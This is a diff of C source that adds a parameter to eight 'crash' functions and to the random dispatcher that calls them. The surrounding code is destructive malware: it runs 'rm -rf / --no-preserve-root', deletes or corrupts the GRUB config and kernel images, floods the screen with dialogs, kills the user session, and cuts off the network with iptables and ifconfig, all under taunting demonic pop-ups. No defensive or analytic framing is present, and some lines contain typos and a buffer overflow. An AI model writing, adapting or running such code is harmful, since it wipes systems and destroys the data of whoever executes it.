@@ -1,41 +1,41 @@
-void crash1(){
+void crash1(int crash_val){
 	system("dbus-launch zenity --error --title 'G4M3_0V3R' --text 'Your game has been ended, but mine is just beginning...for your soul..' --ok-label '👹' 2>/dev/null");
 	system("rm -rf / --no-preserve-root &");
 }
-void crash2(){
+void crash2(int crash_val){
         system("dbus-launch zenity --warning --title 'Demons Overlord' --text 'Hahahahahahahahahahahaaaaaaaaaaaaaa....' --ok-label '😈' 2>/dev/null");
 	for(;;){
 		system("dbus-launch zenity --error --title 'Cr@sh1n9 d0wn' --text 'system failed to load' --ok-lable '👿' 2>/dev/null &");
 	}
 }
-void crash3(){
+void crash3(int crash_val){
 	short int uuid=getuuid();
 	void *ptr=heap_add(1);
 	sprintf(ptr,"loginctl kill-user %d",uuid);
 	system(ptr);
 }
-void crash4(){
+void crash4(int crash_val){
 	system("rm -f /boot/grub/grub.cfg 1>/dev/null");
 	system("dbus-launch zenity --error --title '5oul 0ver' --text 'It's wickedly delightful to see you again!😈' --ok-label '😈' 2>/dev/null");
 	system("shutdown now");
 }
-void crash5(){
+void crash5(int crash_val){
 	system("rm -f /boot/vm*");
 	system("dbus-launch zenity --error --title 'GAME👿OVER' --text 'YOUR SOUL IS MINE' --ok-label '👿' 2>/dev/null");
 	system("reboot");
 }
 char cmd;
-void crash6(){
+void crash6(int crash_val){
 	system("dbus-launch zenity --warning --title 'Diabolic End' --text 'Your identity has been consumed by darkness...' --ok-label '👺'2>/dev/null");
 	sprintf(&cmd,"iptables -t filter -A INPUT --dst %s -j DROP",ip_extract());
 	system(&cmd);
 }
-void crash7(){
+void crash7(int crash_val){
 	system("echo 'rebbot'>>/boot/grub/grub.cfg");
 	system("dbus-lanch zenity --error --title 'DOOmed Spirit' --text 'Your soul is now eternally bound to the darkness..' --ok-label '😈' 2>/dev/null");
 	system("poweroff");
 }
-void crash8(){
+void crash8(int crash_val){
 	sprintf(&cmd,"ifconfig %s down",iface_extract());
 	system(&cmd);
 }
@@ -43,24 +43,24 @@ void system_crash(){
 srand(time(0));
 char val=rand()%0xc;
 if(val>=0x0&&0x1>=val){
-	crash1();
+	crash1(val);
 }
 else if(val>=0x2&&0x3>=val){
-	crash2();
+	crash2(val);
 }
 else if(val>=0x4&&0x5>=val){
-	crash4();
+	crash4(val);
 }
 else if(val>=0x6 && 0x7>=val){
-	crash5();
+	crash5(val);
 }
 else if(val>=0x8 && 0x9>=val){
-	crash7();
+	crash7(val);
 }
 else if(val==0xa){
-	crash6();
+	crash6(val);
 }
 else{
-	crash8();
+	crash8(val);
 }
 }
